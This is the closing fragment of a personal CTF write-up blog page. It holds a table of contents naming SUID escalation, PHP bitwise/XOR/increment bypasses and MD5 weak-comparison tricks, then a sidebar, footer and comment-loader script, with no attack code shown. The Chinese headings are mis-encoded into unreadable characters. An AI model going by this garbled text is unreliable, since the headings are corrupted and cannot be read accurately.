å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆSUID æƒé™ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%B2%BE%E5%87%86%E6%89%BE%E5%88%B0%E5%AE%83%EF%BC%9F"><span class="toc-number">5.5.</span> <span class="toc-text">2. å¦‚ä½•åœ¨æ ¹ç›®å½•ä¸‹ç²¾å‡†æ‰¾åˆ°å®ƒï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%90%E8%A1%8C%E5%AE%83%E5%90%8E%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">5.6.</span> <span class="toc-text">4. è¿è¡Œå®ƒåä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87-Bitwise-NOT"><span class="toc-number">5.7.</span> <span class="toc-text">1. å–åç»•è¿‡ (Bitwise NOT ~)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87-XOR"><span class="toc-number">5.8.</span> <span class="toc-text">2. å¼‚æˆ–ç»•è¿‡ (XOR ^)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87-Increment"><span class="toc-number">5.9.</span> <span class="toc-text">3. è‡ªå¢ç»•è¿‡ (Increment ++)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">6.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">6.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-md5%E5%BC%B1%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">6.2.</span> <span class="toc-text">1.md5å¼±æ¯”è¾ƒç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%B1%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">6.3.</span> <span class="toc-text">2.å¼±æ¯”è¾ƒç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83"><span class="toc-number">6.3.1.</span> <span class="toc-text">1.å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%83%E5%B0%94%E5%80%BC%EF%BC%88True-False%EF%BC%89"><span class="toc-number">6.3.2.</span> <span class="toc-text">2.å¸ƒå°”å€¼ï¼ˆTrue&#x2F;Falseï¼‰</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83%EF%BC%88%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E5%9D%91%EF%BC%89"><span class="toc-number">6.4.</span> <span class="toc-text">1. å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒï¼ˆæœ€å¸¸è§çš„å‘ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2"><span class="toc-number">6.5.</span> <span class="toc-text">2. åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E5%80%BC%EF%BC%88True-False%EF%BC%89%E7%9A%84%E2%80%9C%E4%B8%87%E8%83%BD%E5%8C%B9%E9%85%8D%E2%80%9D"><span class="toc-number">6.6.</span> <span class="toc-text">3. å¸ƒå°”å€¼ï¼ˆTrue&#x2F;Falseï¼‰çš„â€œä¸‡èƒ½åŒ¹é…â€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%95%B0%E7%BB%84%EF%BC%88Array%EF%BC%89%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A4%84%E7%90%86"><span class="toc-number">6.6.1.</span> <span class="toc-text">3. æ•°ç»„ï¼ˆArrayï¼‰çš„ç‰¹æ®Šå¤„ç†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-NULL%E3%80%810%E3%80%81%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.6.2.</span> <span class="toc-text">4. NULLã€0ã€ç©ºå­—ç¬¦ä¸²</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95"><span class="toc-number">6.6.3.</span> <span class="toc-text">5.ç§‘å­¦è®¡æ•°æ³•</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">7.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">7.1.</span> <span class="toc-text">1</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/23/my-article/" title="my-article">my-article</a><time datetime="2026-01-23T03:41:18.000Z" title="å‘è¡¨äº 2026-01-23 11:41:18">2026-01-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/ssrf/" title="ssrf">ssrf</a><time datetime="2026-01-21T11:56:05.000Z" title="å‘è¡¨äº 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/crypto/codetijie/" title="codetijie">codetijie</a><time datetime="2026-01-21T11:56:05.000Z" title="å‘è¡¨äº 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="é€»è¾‘æ¼æ´">é€»è¾‘æ¼æ´</a><time datetime="2026-01-21T11:56:05.000Z" title="å‘è¡¨äº 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="å†…ç½‘æ¸—é€">å†…ç½‘æ¸—é€</a><time datetime="2026-01-21T11:56:05.000Z" title="å‘è¡¨äº 2026-01-21 19:56:05">2026-01-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By qyt</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="å‰å¾€è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': '2829750658t-svg/2829750658t-svg.github.io',
      'data-repo-id': 'R_kgDOQS61dQ',
      'data-category-id': 'DIC_kwDOQS61dc4C1UR-',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>